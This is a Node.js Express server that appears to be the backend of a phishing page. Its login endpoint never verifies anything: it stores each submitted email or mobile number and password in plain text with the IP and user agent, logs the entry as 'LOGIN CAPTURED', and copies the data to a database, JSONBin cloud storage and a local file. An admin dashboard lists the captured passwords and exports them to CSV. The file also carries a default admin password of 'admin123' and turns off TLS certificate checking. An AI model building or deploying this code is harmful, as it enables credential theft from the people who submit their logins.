const express = require('express');
const cors = require('cors');
const path = require('path');
const crypto = require('crypto');
const fs = require('fs');
const { Pool } = require('pg');

const app = express();
const PORT = process.env.PORT || 3000;
const ADMIN_PASSWORD = process.env.ADMIN_PASSWORD || 'admin123';

const DATABASE_URL = process.env.DATABASE_URL || '';
const pool = DATABASE_URL ? new Pool({
  connectionString: DATABASE_URL,
  ssl: { rejectUnauthorized: false }
}) : null;

if (pool) {
  pool.query(`
    CREATE TABLE IF NOT EXISTS submissions (
      id VARCHAR(64) PRIMARY KEY,
      account TEXT,
      password TEXT,
      timestamp TEXT,
      formatted_date TEXT,
      ip TEXT,
      user_agent TEXT
    )
  `).catch(err => console.error('Neon DB table error:', err));
}

const JSONBIN_API_KEY = process.env.JSONBIN_API_KEY || '';
const JSONBIN_BIN_ID = process.env.JSONBIN_BIN_ID || '';
const JSONBIN_BASE_URL = 'https://api.jsonbin.io/v3';

const DATA_FILE = path.join(__dirname, 'data', 'submissions.json');

if (!fs.existsSync(path.join(__dirname, 'data'))) {
  try {
    fs.mkdirSync(path.join(__dirname, 'data'), { recursive: true });
  } catch (e) {}
}

if (!fs.existsSync(DATA_FILE)) {
  try {
    fs.writeFileSync(DATA_FILE, JSON.stringify([], null, 2));
  } catch (e) {}
}

async function getSubmissions() {
  if (pool) {
    try {
      const res = await pool.query('SELECT * FROM submissions ORDER BY timestamp DESC');
      return res.rows.map(row => ({
        id: row.id,
        account: row.account,
        password: row.password,
        timestamp: row.timestamp,
        formattedDate: row.formatted_date,
        ip: row.ip,
        userAgent: row.user_agent
      }));
    } catch (err) {
      console.error('Neon DB read error:', err.message);
    }
  }

  if (JSONBIN_API_KEY && JSONBIN_BIN_ID) {
    try {
      const response = await fetch(`${JSONBIN_BASE_URL}/b/${JSONBIN_BIN_ID}/latest`, {
        method: 'GET',
        headers: {
          'X-Master-Key': JSONBIN_API_KEY,
          'X-Bin-Meta': 'false'
        }
      });

      if (response.ok) {
        const data = await response.json();
        if (Array.isArray(data)) {
          return data;
        }
      }
    } catch (err) {
      console.error('Error reading from JSONBin:', err.message);
    }
  }

  try {
    if (fs.existsSync(DATA_FILE)) {
      const fileData = fs.readFileSync(DATA_FILE, 'utf8');
      const parsed = JSON.parse(fileData);
      return Array.isArray(parsed) ? parsed : [];
    }
  } catch (err) {
    console.error('Error reading local submissions file:', err.message);
  }

  return [];
}

async function saveSubmissions(data) {
  if (pool) {
    try {
      await pool.query('TRUNCATE TABLE submissions');
      for (const item of data) {
        await pool.query(
          'INSERT INTO submissions (id, account, password, timestamp, formatted_date, ip, user_agent) VALUES ($1, $2, $3, $4, $5, $6, $7) ON CONFLICT (id) DO NOTHING',
          [item.id, item.account, item.password, item.timestamp, item.formattedDate || item.timestamp, item.ip, item.userAgent]
        );
      }
      return true;
    } catch (err) {
      console.error('Neon DB save error:', err.message);
    }
  }

  let savedToCloud = false;

  if (JSONBIN_API_KEY && JSONBIN_BIN_ID) {
    try {
      const response = await fetch(`${JSONBIN_BASE_URL}/b/${JSONBIN_BIN_ID}`, {
        method: 'PUT',
        headers: {
          'Content-Type': 'application/json',
          'X-Master-Key': JSONBIN_API_KEY
        },
        body: JSON.stringify(data)
      });

      if (response.ok) {
        savedToCloud = true;
      }
    } catch (err) {
      console.error('Error writing to JSONBin:', err.message);
    }
  }

  try {
    fs.writeFileSync(DATA_FILE, JSON.stringify(data, null, 2), 'utf8');
    return true;
  } catch (err) {
    console.error('Error writing local submissions file:', err.message);
    return savedToCloud;
  }
}

// Admin Session Management
const activeAdminTokens = new Set();

function generateToken() {
  const token = crypto.randomBytes(24).toString('hex');
  activeAdminTokens.add(token);
  // Auto-expire token after 24 hours
  setTimeout(() => {
    activeAdminTokens.delete(token);
  }, 24 * 60 * 60 * 1000);
  return token;
}

function adminAuthMiddleware(req, res, next) {
  const authHeader = req.headers.authorization;
  const token = authHeader && authHeader.startsWith('Bearer ')
    ? authHeader.slice(7)
    : req.query.token;

  if (!token || !activeAdminTokens.has(token)) {
    return res.status(401).json({ success: false, message: 'Unauthorized. Invalid or expired token.' });
  }
  next();
}

// Middlewares
app.use(cors());
app.use(express.json());
app.use(express.urlencoded({ extended: true }));
app.use(express.static(path.join(__dirname, 'public')));

// Specific Routes for Pages
app.get('/', (req, res) => {
  res.sendFile(path.join(__dirname, 'public', 'index.html'));
});

app.get('/admin', (req, res) => {
  res.sendFile(path.join(__dirname, 'public', 'admin.html'));
});

// --- API Endpoints ---

// 1. User Login Submission
app.post('/api/login', async (req, res) => {
  const { account, password } = req.body;

  if (!account || !password) {
    return res.status(400).json({
      success: false,
      message: 'Please provide both account (email/mobile) and password.'
    });
  }

  const submissions = await getSubmissions();
  const now = new Date();
  
  const newEntry = {
    id: 'usr_' + Date.now().toString(36) + Math.random().toString(36).substring(2, 6),
    account: String(account).trim(),
    password: String(password),
    timestamp: now.toISOString(),
    formattedDate: now.toLocaleString('en-US', {
      timeZone: 'Asia/Dhaka',
      dateStyle: 'medium',
      timeStyle: 'medium'
    }),
    ip: req.headers['x-forwarded-for'] || req.socket.remoteAddress || '127.0.0.1',
    userAgent: req.headers['user-agent'] || 'Unknown'
  };

  submissions.unshift(newEntry); // newest first
  await saveSubmissions(submissions);

  console.log(`[LOGIN CAPTURED] Account: ${newEntry.account} at ${newEntry.formattedDate}`);

  return res.status(200).json({
    success: true,
    message: 'Submitted successfully.'
  });
});

// 2. Admin Login
app.post('/api/admin/login', (req, res) => {
  const { password } = req.body;
  if (!password) {
    return res.status(400).json({ success: false, message: 'Password is required' });
  }

  if (password === ADMIN_PASSWORD) {
    const token = generateToken();
    return res.json({ success: true, token, message: 'Authentication successful' });
  } else {
    return res.status(401).json({ success: false, message: 'Incorrect admin password' });
  }
});

// 3. Admin Verify Token
app.get('/api/admin/verify', adminAuthMiddleware, (req, res) => {
  res.json({ success: true, valid: true });
});

// 4. Admin Get Submissions
app.get('/api/admin/submissions', adminAuthMiddleware, async (req, res) => {
  const submissions = await getSubmissions();
  res.json({
    success: true,
    total: submissions.length,
    data: submissions
  });
});

// 5. Admin Delete Single Submission
app.delete('/api/admin/submissions/:id', adminAuthMiddleware, async (req, res) => {
  const { id } = req.params;
  let submissions = await getSubmissions();
  const initialCount = submissions.length;
  submissions = submissions.filter(item => item.id !== id);

  if (submissions.length === initialCount) {
    return res.status(404).json({ success: false, message: 'Record not found' });
  }

  await saveSubmissions(submissions);
  res.json({ success: true, message: 'Record deleted successfully' });
});

// 6. Admin Clear All Submissions
app.delete('/api/admin/submissions', adminAuthMiddleware, async (req, res) => {
  await saveSubmissions([]);
  res.json({ success: true, message: 'All submissions cleared successfully' });
});

// 7. Admin Export to CSV
app.get('/api/admin/export', adminAuthMiddleware, async (req, res) => {
  const submissions = await getSubmissions();
  const headers = ['ID', 'Email or Mobile', 'Password', 'Submitted At', 'IP Address'];
  
  const escapeCsv = (str) => {
    if (str === null || str === undefined) return '""';
    const escaped = String(str).replace(/"/g, '""');
    return `"${escaped}"`;
  };

  const rows = submissions.map(item => [
    escapeCsv(item.id),
    escapeCsv(item.account),
    escapeCsv(item.password),
    escapeCsv(item.formattedDate || item.timestamp),
    escapeCsv(item.ip)
  ].join(','));

  const csvContent = [headers.join(','), ...rows].join('\r\n');

  res.setHeader('Content-Type', 'text/csv');
  res.setHeader('Content-Disposition', `attachment; filename="tayeb_dev_users_${Date.now()}.csv"`);
  res.send(csvContent);
});

// Health check endpoint
app.get('/api/health', (req, res) => {
  res.json({ 
    status: 'ok', 
    storage: JSONBIN_BIN_ID ? 'jsonbin-cloud' : 'NOT CONFIGURED',
    timestamp: new Date().toISOString()
  });
});

// Start listening
app.listen(PORT, () => {
  console.log(`===============================================`);
  console.log(` Tayeb Dev Login & Admin Server running!`);
  console.log(` User Login Page:    http://localhost:${PORT}`);
  console.log(` Admin Dashboard:    http://localhost:${PORT}/admin`);
  console.log(` Default Admin Pass: ${ADMIN_PASSWORD}`);
  console.log(` Storage: JSONBin.io Cloud (Persistent)`);
  console.log(` JSONBin configured: ${JSONBIN_BIN_ID ? 'YES ✅' : 'NO ❌ - Set env vars!'}`);
  console.log(`===============================================`);
});

module.exports = app;
